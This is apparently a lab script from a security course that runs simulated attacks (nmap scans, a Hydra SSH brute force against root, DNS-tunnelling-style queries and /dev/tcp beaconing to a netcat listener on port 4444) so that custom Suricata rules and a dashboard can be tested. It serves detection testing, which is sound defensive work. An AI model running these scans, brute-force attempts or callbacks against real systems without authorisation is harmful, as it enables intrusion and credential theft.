#!/usr/bin/env bash
# =====================================================================
# run_attacks.sh - Automated attack simulation for the SPR888 lab.
# Runs all four MITRE technique scenarios in sequence so the full
# detection -> scoring -> dashboard pipeline can be demonstrated with
# a single command.
#
# RUN FROM THE KALI ATTACKER MACHINE (not the Security VM).
#
# Usage:
#   ./run_attacks.sh <TARGET_IP> [KALI_IP]
#
# Example:
#   ./run_attacks.sh 10.10.10.20 10.20.20.5
#
# Each scenario maps to a custom Suricata rule SID and a MITRE technique:
#   Port scan       T1046       sid 1000001-1000005
#   Brute force     T1110       sid 1000010
#   DNS tunneling   T1071.004   sid 1000020-1000022
#   Beaconing       T1071       sid 1000030-1000031
# =====================================================================
set -uo pipefail

TARGET="${1:-}"
KALI_IP="${2:-}"

if [[ -z "$TARGET" ]]; then
  echo "Usage: $0 <TARGET_IP> [KALI_IP]"
  echo "Example: $0 10.10.10.20 10.20.20.5"
  exit 1
fi

line() { printf '\n========================================\n%s\n========================================\n' "$1"; }

require() {
  if ! command -v "$1" >/dev/null 2>&1; then
    echo "[!] '$1' not installed. Install it or skip this scenario."
    return 1
  fi
  return 0
}

# ---------------------------------------------------------------------
# T1046 - Port Scanning
# ---------------------------------------------------------------------
line "T1046 Port Scan -> $TARGET"
if require nmap; then
  echo "[+] SYN scan (sid 1000001)";  sudo nmap -sS "$TARGET" -p 1-1000 || true
  echo "[+] NULL scan (sid 1000002)"; sudo nmap -sN "$TARGET" -p 1-200  || true
  echo "[+] FIN scan (sid 1000003)";  sudo nmap -sF "$TARGET" -p 1-200  || true
  echo "[+] XMAS scan (sid 1000004)"; sudo nmap -sX "$TARGET" -p 1-200  || true
  echo "[+] UDP scan (sid 1000005)";  sudo nmap -sU --top-ports 50 "$TARGET" || true
fi

# ---------------------------------------------------------------------
# T1110 - Brute Force (SSH)
# ---------------------------------------------------------------------
line "T1110 SSH Brute Force -> $TARGET:22"
if require hydra; then
  WORDLIST="/usr/share/wordlists/fasttrack.txt"
  [[ -f "$WORDLIST" ]] || WORDLIST="/usr/share/wordlists/nmap.lst"
  echo "[+] Hydra SSH attempts (sid 1000010) using $WORDLIST"
  hydra -l root -P "$WORDLIST" -t 4 -f "ssh://$TARGET" || true
else
  echo "[+] Falling back to repeated raw SSH connects"
  for i in $(seq 1 15); do
    timeout 2 bash -c "echo > /dev/tcp/$TARGET/22" 2>/dev/null || true
  done
fi

# ---------------------------------------------------------------------
# T1071.004 - DNS Tunneling (long, high-volume queries)
# ---------------------------------------------------------------------
line "T1071.004 DNS Tunneling -> $TARGET (DNS)"
if require dig; then
  echo "[+] 60 long/high-entropy DNS queries (sid 1000020-1000022)"
  for i in $(seq 1 60); do
    SUB=$(openssl rand -hex 30 2>/dev/null || head -c 30 /dev/urandom | base64 | tr -dc 'a-z0-9')
    dig "${SUB}.tunnel.example.com" @"$TARGET" +time=1 +tries=1 >/dev/null 2>&1 || true
  done
  echo "[+] DNS tunneling burst complete"
else
  echo "[!] dig not available, skipping DNS tunneling"
fi

# ---------------------------------------------------------------------
# T1071 - Beaconing / C2 (repeated outbound to a callback port)
# NOTE: For a true 'internal_outbound' direction, run this block FROM a
# victim VM toward the Kali listener. Start a listener on Kali first:
#   nc -lvnp 4444
# ---------------------------------------------------------------------
line "T1071 Beaconing / C2 callbacks"
if [[ -n "$KALI_IP" ]]; then
  echo "[+] 20 repeated callbacks to $KALI_IP:4444 (sid 1000030-1000031)"
  echo "[+] (Start 'nc -lvnp 4444' on Kali to receive these)"
  for i in $(seq 1 20); do
    timeout 2 bash -c "echo beacon > /dev/tcp/$KALI_IP/4444" 2>/dev/null || true
    sleep 3
  done
  echo "[+] Beaconing simulation complete"
else
  echo "[!] No KALI_IP provided, skipping beaconing. Pass it as the 2nd argument."
fi

line "All attack scenarios complete"
echo "[+] Check the Security VM dashboard for detections, scores, and direction."